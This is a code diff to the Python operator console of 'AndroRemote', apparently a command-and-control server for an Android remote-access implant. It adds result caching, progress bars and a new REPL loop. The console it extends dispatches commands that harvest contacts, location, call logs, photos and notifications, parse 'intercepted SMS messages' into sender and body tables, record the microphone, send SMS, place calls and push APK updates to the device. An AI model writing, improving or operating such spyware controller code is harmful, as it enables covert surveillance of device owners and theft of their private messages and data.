@@ -18,7 +18,7 @@ from collections import deque
 from datetime import datetime
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import parse_qs, urlparse
-
+import cmd
 import readline
 from cryptography.exceptions import InvalidTag
 from cryptography.hazmat.primitives import hashes
@@ -27,6 +27,7 @@ from rich import box
 from rich.console import Console
 from rich.markup import escape
 from rich.panel import Panel
+from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
 from rich.rule import Rule
 from rich.table import Table
 from rich.text import Text
@@ -34,6 +35,64 @@ from rich.text import Text
 from androremote.plugins.base import PluginContext
 from androremote.plugins.manager import PluginManager
 
+
+class ResultCache:
+    """Thread-safe in-memory TTL cache for agent query results."""
+
+    def __init__(self, default_ttl: float = 60.0):
+        self._cache = {}
+        self._lock = threading.Lock()
+        self.default_ttl = default_ttl
+
+    def get(self, cid: str, cmd_str: str):
+        with self._lock:
+            key = (cid, cmd_str.strip().upper())
+            entry = self._cache.get(key)
+            if not entry:
+                return None
+            ts, val = entry
+            if time.time() - ts > self.default_ttl:
+                del self._cache[key]
+                return None
+            return val
+
+    def set(self, cid: str, cmd_str: str, val):
+        with self._lock:
+            key = (cid, cmd_str.strip().upper())
+            self._cache[key] = (time.time(), val)
+
+    def invalidate(self, cid: str = None) -> int:
+        with self._lock:
+            if cid is None:
+                cnt = len(self._cache)
+                self._cache.clear()
+                return cnt
+            keys_to_del = [k for k in self._cache if k[0] == cid]
+            for k in keys_to_del:
+                del self._cache[k]
+            return len(keys_to_del)
+
+    def items(self):
+        with self._lock:
+            now = time.time()
+            res = []
+            for (cid, cmd_str), (ts, val) in list(self._cache.items()):
+                age = now - ts
+                if age <= self.default_ttl:
+                    res.append({
+                        "cid": cid,
+                        "cmd": cmd_str,
+                        "age": age,
+                        "size": len(str(val)) if val else 0,
+                    })
+            return res
+
+
+CACHE = ResultCache(default_ttl=60.0)
+CACHEABLE_CMDS = {
+    "INFO", "ID", "PERMS", "APPS", "CONTACTS", "NOTIFS",
+    "LOC", "CALLLOG", "PHOTOS", "SMSIN", "LOG", "SMSLOG"
+}
 PORT_DEFAULT = 8742
 BEACON_TIMEOUT = 75
 HOME_DIR = os.path.expanduser("~/.androremote")
@@ -227,6 +286,10 @@ class Handler(BaseHTTPRequestHandler):
             c["seq"] += 1
             c["last_seen"] = time.time()
             last_cmd = c.get("last_cmd") or ""
+            if last_cmd:
+                op_base = last_cmd.split()[0].upper()
+                if op_base in CACHEABLE_CMDS and not result.startswith("ERR"):
+                    CACHE.set(cid, last_cmd, result)
 
         if PLUGIN_MANAGER:
             client_ip = self.client_address[0] if self.client_address else "unknown"
@@ -252,7 +315,7 @@ def queue(cid, cmd):
         PLUGIN_MANAGER.trigger_hook("on_command_queued", cid, cmd)
 
 
-def send_and_wait(cmd, client_id=None, timeout=BEACON_TIMEOUT):
+def send_and_wait(cmd, client_id=None, timeout=BEACON_TIMEOUT, use_cache=True, force_refresh=False):
     cid = client_id or ACTIVE["id"]
     if not cid:
         ev("!", "no active session — run: /use", "yellow")
@@ -263,23 +326,35 @@ def send_and_wait(cmd, client_id=None, timeout=BEACON_TIMEOUT):
             return None
         seq = c["seq"]
     tag = alias_tag(cid)
-    op_name = cmd.split()[0]
+    op_name = cmd.split()[0].upper()
+
+    if use_cache and not force_refresh and op_name in CACHEABLE_CMDS:
+        cached = CACHE.get(cid, cmd)
+        if cached is not None:
+            ev("⚡", f"using cached response for [cyan]{op_name}[/cyan]  [dim]({tag} · add --refresh to update)[/dim]", "dim cyan")
+            return cached
+
     ev(">", f"dispatch to [cyan bold]{tag}[/cyan bold]  [dim]{cmd[:64]}[/dim]", "magenta")
     queue(cid, cmd)
     t0 = time.time()
     with console.status(
         f"[cyan]Waiting for beacon from [bold]{escape(tag)}[/bold] ([magenta]{escape(op_name)}[/magenta])...[/cyan]",
         spinner="dots",
-    ):
+    ) as status:
         while time.time() - t0 < timeout:
+            elapsed = int(time.time() - t0)
+            if elapsed > 1:
+                status.update(f"[cyan]Waiting for beacon from [bold]{escape(tag)}[/bold] ([magenta]{escape(op_name)}[/magenta]) [dim][{elapsed}s][/dim]...[/cyan]")
             with LOCK:
                 c = CLIENTS.get(cid)
                 if c and c["seq"] > seq and c["result"] is not None:
-                    return c["result"]
+                    res = c["result"]
+                    if op_name in CACHEABLE_CMDS and not res.startswith("ERR"):
+                        CACHE.set(cid, cmd, res)
+                    return res
             time.sleep(0.2)
     ev("!", f"timeout after {timeout}s — [cyan]{tag}[/cyan] may be offline", "yellow")
     return None
-
 
 # ────────────────────────── tunnel management ─────────────────────────
 
@@ -632,6 +707,8 @@ def cmd_status():
         pcount = len(PLUGIN_MANAGER.plugins)
         cmdcount = len(PLUGIN_MANAGER.commands)
         t.add_row("Plugins", f"[bold cyan]{pcount}[/bold cyan] loaded ({cmdcount} custom commands)")
+    cached_count = len(CACHE.items())
+    t.add_row("Cache", f"[bold cyan]{cached_count}[/bold cyan] response(s) in-memory [dim](TTL: {int(CACHE.default_ttl)}s · /cache)[/dim]")
 
     console.print(t)
     console.print()
@@ -676,9 +753,16 @@ def show_result(text):
             else:
                 console.print(f"    [white]{escape(ln)}[/white]")
     else:
-        for ln in lines:
-            console.print(f"  {escape(ln)}")
-
+        if len(lines) > 25 and sys.stdin.isatty():
+            rows = [(str(i), escape(ln)) for i, ln in enumerate(lines, 1)]
+            columns = [
+                ("#", {"style": "dim", "width": 5, "justify": "right"}),
+                ("Output", {"style": "white"}),
+            ]
+            show_paginated_table("COMMAND OUTPUT", columns, rows, page_size=25)
+        else:
+            for ln in lines:
+                console.print(f"  {escape(ln)}")
 
 def ok(msg):
     ev("✓", msg, "green")
@@ -695,15 +779,29 @@ def usage(msg):
 def download_b64(r, dest):
     parts = r.split(" ", 2)
     if len(parts) == 3 and parts[0] == "OK":
-        with console.status(f"[cyan]Decoding & saving to [bold]{escape(dest)}[/bold]...[/cyan]", spinner="dots"):
-            data = base64.b64decode(parts[2] + "=" * (-len(parts[2]) % 4))
+        b64_str = parts[2]
+        data = base64.b64decode(b64_str + "=" * (-len(b64_str) % 4))
+        total_len = len(data)
+        dest_name = os.path.basename(dest)
+        with Progress(
+            SpinnerColumn(spinner_name="dots", style="cyan"),
+            TextColumn(f"[bold cyan]Saving [white]{escape(dest_name)}[/white][/bold cyan]"),
+            BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
+            TextColumn("[bold green]{task.completed:,}[/bold green]/{task.total:,} bytes"),
+            console=console,
+            transient=True,
+        ) as progress:
+            task = progress.add_task("Saving", total=total_len)
+            chunk_size = 65536
             with open(dest, "wb") as f:
-                f.write(data)
-        ok(f"{len(data):,} bytes → [cyan]{escape(dest)}[/cyan]")
+                for offset in range(0, total_len, chunk_size):
+                    chunk = data[offset:offset + chunk_size]
+                    f.write(chunk)
+                    progress.advance(task, len(chunk))
+        ok(f"{total_len:,} bytes → [cyan]{escape(dest)}[/cyan]")
         return True
     show_result(r)
     return False
-
 
 # ─────────────────────────── data formatting & pagination ─────────────────
 
@@ -760,11 +858,10 @@ def show_paginated_table(title, columns, rows, page_size=20, start_page=1):
         remaining = total - end_idx
         prompt_str = f"  [cyan bold]Next page ({remaining} more)?[/cyan bold] [dim]Enter: next · a: all · q: quit · #jump: [/dim]"
         try:
-            choice = input(prompt_str).strip().lower()
+            choice = console.input(prompt_str).strip().lower()
         except (EOFError, KeyboardInterrupt):
             console.print()
             break
-
         if choice in ("q", "quit", "exit"):
             break
         elif choice in ("a", "all"):
@@ -1079,35 +1176,174 @@ def format_perms(raw_text):
     show_paginated_table("DEVICE PERMISSIONS", columns, rows, page_size=20)
 
 
-def format_log(raw_text):
-    if not raw_text or raw_text.startswith("ERR"):
-        show_result(raw_text)
+def cmd_log(page=1, force_refresh=False):
+    """Retrieve and display actual intercepted SMS messages in a paginated table."""
+    cid = ACTIVE["id"]
+    if not cid:
+        ev("!", "no active session — run: /use", "yellow")
         return
-    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
-    if lines and lines[0].startswith("OK"):
-        lines[0] = lines[0][3:].strip()
-    lines = [ln for ln in lines if ln]
+
+    tag = alias_tag(cid)
+    cached_entries = CACHE.get(cid, "PARSED_SMS_LOGS")
+    if cached_entries is not None and not force_refresh:
+        ev("⚡", f"displaying cached SMS logs  [dim]({tag} · add --refresh to update)[/dim]", "dim cyan")
+        records = cached_entries
+    else:
+        raw_list = send_and_wait("LOG", use_cache=not force_refresh, force_refresh=force_refresh)
+        if not raw_list or raw_list.startswith("ERR"):
+            show_result(raw_list)
+            return
+        if "no logs" in raw_list.lower():
+            show_paginated_table("INTERCEPTED SMS MESSAGES", [
+                ("#", {"style": "dim", "width": 4}),
+                ("Time", {"style": "dim", "width": 20}),
+                ("From", {"style": "bold cyan", "width": 16}),
+                ("Message", {"style": "white"}),
+            ], [])
+            return
+
+        lines = [ln.strip() for ln in raw_list.splitlines() if ln.strip()]
+        if lines and lines[0].startswith("OK"):
+            lines[0] = lines[0][3:].strip()
+        files = [ln for ln in lines if ln and ln != "no logs"]
+        if not files:
+            show_paginated_table("INTERCEPTED SMS MESSAGES", [
+                ("#", {"style": "dim", "width": 4}),
+                ("Time", {"style": "dim", "width": 20}),
+                ("From", {"style": "bold cyan", "width": 16}),
+                ("Message", {"style": "white"}),
+            ], [])
+            return
+
+        records = []
+        with Progress(
+            SpinnerColumn(spinner_name="dots", style="cyan"),
+            TextColumn("[bold cyan]{task.description}[/bold cyan]"),
+            BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
+            TextColumn("[bold green]{task.completed}[/bold green]/{task.total}"),
+            console=console,
+            transient=True,
+        ) as progress:
+            task = progress.add_task("Retrieving intercepted SMS data...", total=len(files))
+            for f in sorted(files, reverse=True):
+                content = CACHE.get(cid, f"SMSLOG_{f}")
+                if content is None or force_refresh:
+                    content = send_and_wait(f"SMSLOG {f}", use_cache=False)
+                    if content:
+                        CACHE.set(cid, f"SMSLOG_{f}", content)
+
+                ts_display = "-"
+                m = re.search(r"sms_(\d{4})(\d{2})(\d{2})_(\d{2})(\d{2})(\d{2})", f)
+                if m:
+                    ts_display = f"{m.group(1)}-{m.group(2)}-{m.group(3)} {m.group(4)}:{m.group(5)}:{m.group(6)}"
+
+                sender = "?"
+                body = ""
+                if content and not content.startswith("ERR"):
+                    clean = content[3:].strip() if content.startswith("OK") else content.strip()
+                    lines_c = clean.splitlines()
+                    for idx_l, ln in enumerate(lines_c):
+                        if ln.startswith("from="):
+                            sender = ln[5:].strip()
+                            body = "\n".join(lines_c[idx_l + 1:]).strip()
+                            break
+                    if not body and clean:
+                        body = clean
+
+                records.append({
+                    "time": ts_display,
+                    "from": sender,
+                    "body": body,
+                    "file": f,
+                })
+                progress.advance(task)
+
+        CACHE.set(cid, "PARSED_SMS_LOGS", records)
 
     rows = []
-    for idx, f in enumerate(lines, 1):
-        rows.append((str(idx), escape(f)))
+    for idx, r in enumerate(records, 1):
+        rows.append((str(idx), escape(r["time"]), escape(r["from"]), escape(r["body"])))
 
     columns = [
         ("#", {"style": "dim", "width": 4}),
-        ("Log File", {"style": "cyan"}),
+        ("Time", {"style": "dim", "width": 20}),
+        ("From", {"style": "bold cyan", "width": 16}),
+        ("Message", {"style": "white"}),
     ]
-    show_paginated_table("CAPTURED LOG FILES", columns, rows, page_size=20)
+    show_paginated_table("INTERCEPTED SMS MESSAGES", columns, rows, page_size=15, start_page=page)
+
+
+def format_log(raw_text, page=1):
+    """Backwards-compatible wrapper: parses log list and displays actual SMS records."""
+    cmd_log(page=page)
 
 
 def format_smslog(raw_text):
     if not raw_text or raw_text.startswith("ERR"):
         show_result(raw_text)
         return
-    lines = raw_text.splitlines()
-    if lines and lines[0].startswith("OK"):
-        lines = lines[1:]
-    body = "\n".join(lines).strip()
-    console.print(Panel(escape(body) if body else "[dim]<empty log>[/dim]", title="[bold cyan]SMS INTERCEPT LOG[/bold cyan]", border_style="cyan", box=box.ROUNDED, padding=(1, 2)))
+    clean = raw_text[3:].strip() if raw_text.startswith("OK") else raw_text.strip()
+    sender = "?"
+    body = clean
+    lines = clean.splitlines()
+    for idx, ln in enumerate(lines):
+        if ln.startswith("from="):
+            sender = ln[5:].strip()
+            body = "\n".join(lines[idx + 1:]).strip()
+            break
+
+    t = Table(title="[bold cyan]INTERCEPTED SMS RECORD[/bold cyan]", box=box.ROUNDED, border_style="cyan", header_style="bold magenta", expand=False)
+    t.add_column("Field", style="bold cyan", width=12)
+    t.add_column("Value", style="white")
+    t.add_row("Sender", f"[bold green]{escape(sender)}[/bold green]")
+    t.add_row("Message", escape(body))
+    console.print(t)
+    console.print()
+
+
+def cmd_smslog(target=None):
+    if not target:
+        cmd_log(page=1)
+        return
+    cid = ACTIVE["id"]
+    if not cid:
+        ev("!", "no active session — run: /use", "yellow")
+        return
+    res = send_and_wait(f"SMSLOG {target}")
+    format_smslog(res or "")
+
+
+def cmd_cache(args):
+    sub = args[0].lower() if args else "list"
+    subargs = args[1:]
+    if sub in ("list", "ls"):
+        items = CACHE.items()
+        rows = []
+        for idx, it in enumerate(items, 1):
+            rows.append((
+                str(idx),
+                escape(alias_tag(it["cid"])),
+                escape(it["cmd"]),
+                f"{int(it['age'])}s ago",
+                f"{it['size']:,} B",
+            ))
+        columns = [
+            ("#", {"style": "dim", "width": 4}),
+            ("Session", {"style": "bold cyan", "width": 16}),
+            ("Command", {"style": "white", "width": 24}),
+            ("Age", {"style": "dim", "width": 12}),
+            ("Size", {"style": "green", "justify": "right"}),
+        ]
+        page = int(subargs[0]) if subargs and subargs[0].isdigit() else 1
+        show_paginated_table("RESULT CACHE", columns, rows, page_size=20, start_page=page)
+        console.print("  [dim]Clear with: [bold cyan]/cache clear[/bold cyan] · bypass with [bold]--refresh[/bold][/dim]\n")
+    elif sub == "clear":
+        target = subargs[0] if subargs else None
+        target_cid = resolve_tag(target) if target else None
+        count = CACHE.invalidate(target_cid)
+        ok(f"purged {count} cached entry/entries" + (f" for [cyan]{escape(target)}[/cyan]" if target else ""))
+    else:
+        usage("cache [list|clear] [target]")
 
 
 def format_history(start_page=1):
@@ -1153,7 +1389,8 @@ COMMAND_INFO = {
               "Clears the terminal display."),
     "plugins": ("manage", "/plugins", "List loaded plugins and their commands",
                 "Aliases: /plugin\nDisplays loaded modular plugins, author, version, and status.\nUse /plugin info|load|unload|reload for management."),
-    # recon
+    "cache": ("manage", "/cache [list|clear] [target]", "Inspect or clear in-memory command result cache",
+              "Displays currently cached device query responses (info, perms, apps, contacts, logs, etc.) or clears cached items.\nExample:\n  /cache\n  /cache clear"),
     "ping": ("recon", "/ping", "Test agent responsiveness (returns PONG)",
              "Sends PING to active agent. Verifies round-trip beacon latency and agent liveness."),
     "id": ("recon", "/id", "Query device model, brand & SDK version",
@@ -1191,10 +1428,10 @@ COMMAND_INFO = {
             "Sends an SMS message from the device's default SIM.\nExample:\n  /sms +15551234567 Hello from Android"),
     "call": ("comms", "/call <number>", "Place phone call on speakerphone",
              "Initiates an outgoing phone call with speakerphone enabled.\nExample:\n  /call +15551234567"),
-    "log": ("comms", "/log", "View intercepted SMS log summary",
-            "Lists captured SMS messages logged by the background SMS receiver."),
-    "smslog": ("comms", "/smslog [name]", "Read specific SMS intercept log",
-               "Reads the content of an SMS intercept log file."),
+    "log": ("comms", "/log [page] [--refresh]", "Read intercepted incoming SMS messages (paginated table)",
+            "Fetches and parses intercepted SMS messages, displaying timestamp, sender, and body in a paginated table.\nExample:\n  /log\n  /log 2\n  /log --refresh"),
+    "smslog": ("comms", "/smslog [name]", "View specific intercepted SMS message details",
+               "Reads the content of a specific SMS intercept record. If no name given, lists all in a paginated table.\nExample:\n  /smslog\n  /smslog sms_20260904_120000_123.txt"),
     "rec": ("comms", "/rec <secs> [out.wav]", "Record mic audio & download WAV",
             "Records audio from device microphone for specified seconds and downloads it locally.\nExample:\n  /rec 10 mic_sample.wav"),
     # device
@@ -1505,6 +1742,15 @@ def _compute_completions(text):
         return complete_filepath(text)
     if cmd == "rec" and arg_idx == 2:
         return complete_filepath(text)
+    if cmd == "cache" and arg_idx == 1:
+        return [s for s in ("list", "clear") if s.startswith(text)]
+    if cmd == "cache" and arg_idx == 2 and tokens[1] == "clear":
+        with LOCK:
+            known = list(CLIENTS.keys()) + list(ALIASES.values())
+        return [s for s in sorted(set(known)) if s.startswith(text)]
+    if cmd in ("info", "perms", "apps", "contacts", "notifs", "loc", "calllog", "photos", "smsin", "log") and arg_idx >= 1:
+        if "--refresh".startswith(text):
+            return ["--refresh"]
     if cmd == "build" and arg_idx == 1:
         cands = []
         if TUNNEL.get("url"):
@@ -1558,14 +1804,13 @@ def setup_autocomplete():
 
 def get_readline_prompt():
     """Build ANSI prompt with \001...\002 markers so readline measures visible length accurately.
-    This prevents backspace from deleting the prompt."""
+    Properly displays c2> and c2:tag> with zero cursor offset drift."""
     active = ACTIVE["id"]
     if active:
         tag = alias_tag(active)
-        return f"\001\033[1;35m\002c2\001\033[0m\002:\001\033[1;36m\002{tag}\001\033[0m\002 \001\033[1m\002❯\001\033[0m\002 "
+        return f"\001\033[1;35m\002c2\001\033[0m\002:\001\033[1;36m\002{tag}\001\033[1;37m\002>\001\033[0m\002 "
     else:
-        return "\001\033[1;35m\002c2\001\033[0m\002 \001\033[2m\002❯\001\033[0m\002 "
-
+        return "\001\033[1;35m\002c2\001\033[1;37m\002>\001\033[0m\002 "
 
 def cmd_build(target_url=None):
     root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -1621,6 +1866,13 @@ def dispatch(argv):
     op = raw_op.lstrip("/").lower()
     rest = argv[1:]
 
+    force_refresh = False
+    if "--refresh" in rest:
+        force_refresh = True
+        rest = [r for r in rest if r != "--refresh"]
+    elif "-r" in rest:
+        force_refresh = True
+        rest = [r for r in rest if r != "-r"]
     if op in ("quit", "exit", "q"):
         return False
     elif op in ("help", "?", ""):
@@ -1642,6 +1894,8 @@ def dispatch(argv):
         console.clear()
     elif op in ("plugins", "plugin"):
         cmd_plugin(rest)
+    elif op == "cache":
+        cmd_cache(rest)
     elif op == "history":
         format_history(start_page=int(rest[0]) if rest and rest[0].isdigit() else 1)
     elif op == "rename":
@@ -1675,30 +1929,34 @@ def dispatch(argv):
     elif op == "ping":
         show_result(send_and_wait("PING") or "")
     elif op == "id":
-        show_result(send_and_wait("ID") or "")
+        show_result(send_and_wait("ID", force_refresh=force_refresh) or "")
     elif op == "info":
-        format_info(send_and_wait("INFO") or "")
+        format_info(send_and_wait("INFO", force_refresh=force_refresh) or "")
     elif op == "contacts":
         n = rest[0] if rest and rest[0].isdigit() else "50"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
-        format_contacts(send_and_wait(f"CONTACTS {n}") or "", page=page)
+        format_contacts(send_and_wait(f"CONTACTS {n}", force_refresh=force_refresh) or "", page=page)
     elif op == "smsin":
         n = rest[0] if rest and rest[0].isdigit() else "20"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
-        format_smsin(send_and_wait(f"SMSIN {n}") or "", page=page)
+        format_smsin(send_and_wait(f"SMSIN {n}", force_refresh=force_refresh) or "", page=page)
     elif op == "perms":
-        format_perms(send_and_wait("PERMS") or "")
+        format_perms(send_and_wait("PERMS", force_refresh=force_refresh) or "")
     elif op == "apps":
         page = int(rest[0]) if rest and rest[0].isdigit() else 1
-        format_apps(send_and_wait("APPS") or "", page=page)
+        format_apps(send_and_wait("APPS", force_refresh=force_refresh) or "", page=page)
     elif op == "notifs":
         n = rest[0] if rest and rest[0].isdigit() else "25"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
-        format_notifs(send_and_wait(f"NOTIFS {n}") or "", page=page)
+        format_notifs(send_and_wait(f"NOTIFS {n}", force_refresh=force_refresh) or "", page=page)
     elif op == "log":
-        format_log(send_and_wait("LOG") or "")
+        page = int(rest[0]) if rest and rest[0].isdigit() else 1
+        cmd_log(page=page, force_refresh=force_refresh)
     elif op == "smslog":
-        format_smslog(send_and_wait("SMSLOG " + (rest[0] if rest else "")) or "")
+        if rest:
+            cmd_smslog(rest[0])
+        else:
+            cmd_log(page=1, force_refresh=force_refresh)
     elif op == "ls":
         path = rest[0] if rest and not rest[0].isdigit() else "/sdcard"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else (int(rest[0]) if rest and rest[0].isdigit() else 1)
@@ -1721,7 +1979,7 @@ def dispatch(argv):
     elif op == "calllog":
         n = rest[0] if rest and rest[0].isdigit() else "25"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
-        format_calllog(send_and_wait(f"CALLLOG {n}") or "", page=page)
+        format_calllog(send_and_wait(f"CALLLOG {n}", force_refresh=force_refresh) or "", page=page)
     elif op == "call":
         if not rest:
             usage("call <number>")
@@ -1732,7 +1990,7 @@ def dispatch(argv):
     elif op == "photos":
         n = rest[0] if rest and rest[0].isdigit() else "30"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
-        format_photos(send_and_wait(f"PHOTOS {n}") or "", page=page)
+        format_photos(send_and_wait(f"PHOTOS {n}", force_refresh=force_refresh) or "", page=page)
     elif op == "get":
         if len(rest) < 2:
             usage("get <remote> <local>")
@@ -1749,8 +2007,19 @@ def dispatch(argv):
                 return err(f"read {escape(rest[0])}: {e}")
             if len(data) > 32 * 1024 * 1024:
                 return err("put: >32MB")
-            with console.status(f"[cyan]Encoding [bold]{escape(rest[0])}[/bold] ({len(data):,} bytes)...[/cyan]", spinner="dots"):
+            total_bytes = len(data)
+            fname = os.path.basename(rest[0])
+            with Progress(
+                SpinnerColumn(spinner_name="dots", style="cyan"),
+                TextColumn(f"[bold cyan]Preparing [white]{escape(fname)}[/white][/bold cyan]"),
+                BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
+                TextColumn("[bold green]{task.completed:,}[/bold green]/{task.total:,} bytes"),
+                console=console,
+                transient=True,
+            ) as progress:
+                task = progress.add_task("Preparing", total=total_bytes)
                 payload = "PUTB64 " + b64s(rest[1]) + " " + base64.b64encode(data).decode()
+                progress.advance(task, total_bytes)
             show_result(send_and_wait(payload) or "")
     elif op == "screen":
         dest = rest[0] if rest else "screen.png"
@@ -1823,8 +2092,18 @@ def dispatch(argv):
             if len(data) > 32 * 1024 * 1024:
                 return err("update: >32MB")
             remote = "/storage/emulated/0/Android/data/com.ohmpi.androremote/files/update.apk"
-            with console.status(f"[cyan]Packaging APK update ({len(data):,} bytes)...[/cyan]", spinner="dots"):
+            total_bytes = len(data)
+            with Progress(
+                SpinnerColumn(spinner_name="dots", style="cyan"),
+                TextColumn("[bold cyan]Packaging APK update[/bold cyan]"),
+                BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
+                TextColumn("[bold green]{task.completed:,}[/bold green]/{task.total:,} bytes"),
+                console=console,
+                transient=True,
+            ) as progress:
+                task = progress.add_task("Packaging", total=total_bytes)
                 payload = "PUTB64 " + b64s(remote) + " " + base64.b64encode(data).decode()
+                progress.advance(task, total_bytes)
             show_result(send_and_wait(payload) or "")
             show_result(send_and_wait("INSTALL " + remote) or "")
             console.print("  [dim](device will re-beacon after the update; check: /installstatus)[/dim]")
@@ -1865,6 +2144,51 @@ def ev(sym, msg, style=""):
         pass
 
 
+class C2Console(cmd.Cmd):
+    """Interactive command loop for AndroRemote C2 (cmd + readline)."""
+
+    def __init__(self):
+        super().__init__()
+        self.use_rawinput = True
+        self.update_prompt()
+
+    def update_prompt(self):
+        self.prompt = get_readline_prompt()
+
+    def precmd(self, line):
+        self.update_prompt()
+        return line
+
+    def postcmd(self, stop, line):
+        self.update_prompt()
+        return stop
+
+    def emptyline(self):
+        pass
+
+    def default(self, line):
+        line = line.strip()
+        if not line:
+            return False
+        try:
+            argv = shlex.split(line)
+        except ValueError as e:
+            err(f"parse: {escape(str(e))}")
+            return False
+        try:
+            res = dispatch(argv)
+            if res is False:
+                return True
+        except KeyboardInterrupt:
+            console.print("  [yellow]^C interrupted — command may still be queued[/yellow]")
+        except Exception as e:
+            err(f"{type(e).__name__}: {escape(str(e))}")
+        return False
+
+    def onecmd(self, line):
+        return self.default(line)
+
+
 def repl():
     setup_autocomplete()
     ev("*", "console ready — [bold cyan]/help[/bold cyan] for commands, "
@@ -1874,32 +2198,18 @@ def repl():
         readline.read_history_file(HISTORY_FILE)
     except Exception:
         pass
-    while True:
-        try:
-            line = input(get_readline_prompt()).strip()
-        except (EOFError, KeyboardInterrupt):
-            console.print()
-            break
-        if not line:
-            continue
-        try:
-            argv = shlex.split(line)
-        except ValueError as e:
-            err(f"parse: {escape(str(e))}")
-            continue
-        try:
-            if not dispatch(argv):
-                break
-        except KeyboardInterrupt:
-            console.print("  [yellow]^C interrupted — command may still be queued[/yellow]")
-        except Exception as e:
-            err(f"{type(e).__name__}: {escape(str(e))}")
-    try:
-        readline.set_history_length(1000)
-        readline.write_history_file(HISTORY_FILE)
-    except Exception:
-        pass
 
+    c2_console = C2Console()
+    try:
+        c2_console.cmdloop()
+    except (EOFError, KeyboardInterrupt):
+        console.print()
+    finally:
+        try:
+            readline.set_history_length(1000)
+            readline.write_history_file(HISTORY_FILE)
+        except Exception:
+            pass
 
 BANNER_ART = r"""
  █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗     ██████╗██████╗
